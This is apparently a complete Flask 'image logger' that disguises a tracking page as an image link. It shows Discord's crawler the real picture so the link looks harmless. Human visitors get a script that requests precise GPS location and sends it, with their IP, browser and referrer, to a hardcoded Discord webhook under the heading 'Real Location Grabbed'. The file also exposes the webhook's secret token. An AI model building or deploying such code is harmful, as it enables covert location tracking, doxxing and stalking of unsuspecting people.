from flask import Flask, request, make_response, render_template_string, jsonify, redirect, url_for
import httpagentparser
import requests
import datetime
import json
import urllib.parse
import re

app = Flask(__name__)

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1527179048684621934/ereAKZmM3p-QZK_PUCJdS0OFGu7ikkJCQNHKb6L9DVLF_aB82iDW_zioBb7PGNMQKUwo"
IMAGE_URL = "https://i.pinimg.com/236x/6a/3d/33/6a3d336840b6a2d91efde0ff77f038e9.jpg"

def fetch_image():
    try:
        r = requests.get(IMAGE_URL, timeout=10)
        r.raise_for_status()
        return r.content, r.headers.get('Content-Type', 'image/jpeg')
    except:
        return b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;', 'image/gif'

def is_discord_bot(user_agent):
    """Check if the request is from Discord's embed crawler"""
    if not user_agent:
        return False
    ua_lower = user_agent.lower()
    discord_patterns = [
        'discordbot',
        'discord',
        'mozilla/5.0 (compatible; discordbot',
        'mediapartners-google'  # sometimes Discord uses this
    ]
    for pattern in discord_patterns:
        if pattern in ua_lower:
            return True
    return False

# HTML + JS that asks for geolocation and sends to webhook, then redirects to image
GEO_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <script>
        function sendLocation(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            const data = {
                lat: lat,
                lng: lng,
                accuracy: accuracy,
                ip: "{{ ip }}",
                user_agent: "{{ user_agent }}",
                referrer: "{{ referrer }}",
                timestamp: "{{ timestamp }}"
            };
            // Send to your webhook via fetch (silent)
            fetch('/log_location', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).catch(e => console.log(e));
            // Then redirect to the actual image with geo=1
            window.location.href = "{{ image_url }}?geo=1";
        }
        function errorLocation(err) {
            // If denied or error, just redirect to image anyway
            window.location.href = "{{ image_url }}?geo=0";
        }
        // Ask for location immediately
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendLocation, errorLocation, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        } else {
            // Fallback: redirect
            window.location.href = "{{ image_url }}?geo=0";
        }
    </script>
</head>
<body>
    <p>Loading image...</p>
</body>
</html>
"""

@app.route('/api/image', methods=['GET'])
def serve_image():
    user_agent = request.headers.get('User-Agent', '')
    
    # If it's a Discord bot, serve the image directly (no location prompt)
    if is_discord_bot(user_agent):
        image_data, content_type = fetch_image()
        response = make_response(image_data)
        response.headers.set('Content-Type', content_type)
        response.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate')
        response.headers.set('Pragma', 'no-cache')
        return response
    
    # If we have ?geo=1 or ?geo=0, just serve the image (after location prompt)
    if request.args.get('geo') is not None:
        image_data, content_type = fetch_image()
        response = make_response(image_data)
        response.headers.set('Content-Type', content_type)
        response.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate')
        response.headers.set('Pragma', 'no-cache')
        return response

    # Otherwise, serve the HTML that will ask for location
    ip = request.headers.get('X-Forwarded-For', request.remote_addr or 'Unknown')
    referrer = request.headers.get('Referer', 'No referrer')
    timestamp = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')

    # Parse UA for fun (will also send later)
    try:
        parsed = httpagentparser.detect(user_agent)
        browser = parsed.get('browser', {}).get('name', 'Unknown')
        os_name = parsed.get('os', {}).get('name', 'Unknown')
        device = parsed.get('device', 'Unknown')
    except:
        browser = os_name = device = "Unknown"

    # Render HTML with placeholders
    html = GEO_HTML.replace("{{ ip }}", ip)
    html = html.replace("{{ user_agent }}", user_agent.replace("'", "\\'"))
    html = html.replace("{{ referrer }}", referrer.replace("'", "\\'"))
    html = html.replace("{{ timestamp }}", timestamp)
    html = html.replace("{{ image_url }}", IMAGE_URL)

    response = make_response(html)
    response.headers.set('Content-Type', 'text/html')
    response.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate')
    return response

@app.route('/log_location', methods=['POST'])
def log_location():
    data = request.get_json()
    if not data:
        return '', 204

    lat = data.get('lat', 'Unknown')
    lng = data.get('lng', 'Unknown')
    accuracy = data.get('accuracy', 'Unknown')
    ip = data.get('ip', 'Unknown')
    user_agent = data.get('user_agent', 'Unknown')
    referrer = data.get('referrer', 'No referrer')
    timestamp = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')

    # Parse UA again (or we can store browser/os)
    try:
        parsed = httpagentparser.detect(user_agent)
        browser = parsed.get('browser', {}).get('name', 'Unknown')
        os_name = parsed.get('os', {}).get('name', 'Unknown')
        device = parsed.get('device', 'Unknown')
    except:
        browser = os_name = device = "Unknown"

    # Build Discord embed with real coordinates
    embed = {
        "title": "📍 GPS Location Captured",
        "color": 0xff0000,
        "fields": [
            {"name": "🌐 IP", "value": f"`{ip}`", "inline": True},
            {"name": "📱 Browser", "value": f"`{browser}`", "inline": True},
            {"name": "💻 OS/Device", "value": f"`{os_name} - {device}`", "inline": True},
            {"name": "📍 Latitude", "value": f"`{lat}`", "inline": True},
            {"name": "📍 Longitude", "value": f"`{lng}`", "inline": True},
            {"name": "🎯 Accuracy", "value": f"`{accuracy}m`", "inline": True},
            {"name": "🔗 Referrer", "value": f"`{referrer}`", "inline": False},
            {"name": "⏰ Time", "value": timestamp, "inline": False}
        ],
        "footer": {"text": "Image Logger • Vercel • Geo-Enabled"}
    }

    payload = {
        "content": "**🚨 Real Location Grabbed**",
        "embeds": [embed]
    }

    try:
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
    except:
        pass

    return '', 204

if __name__ == '__main__':
    app.run()
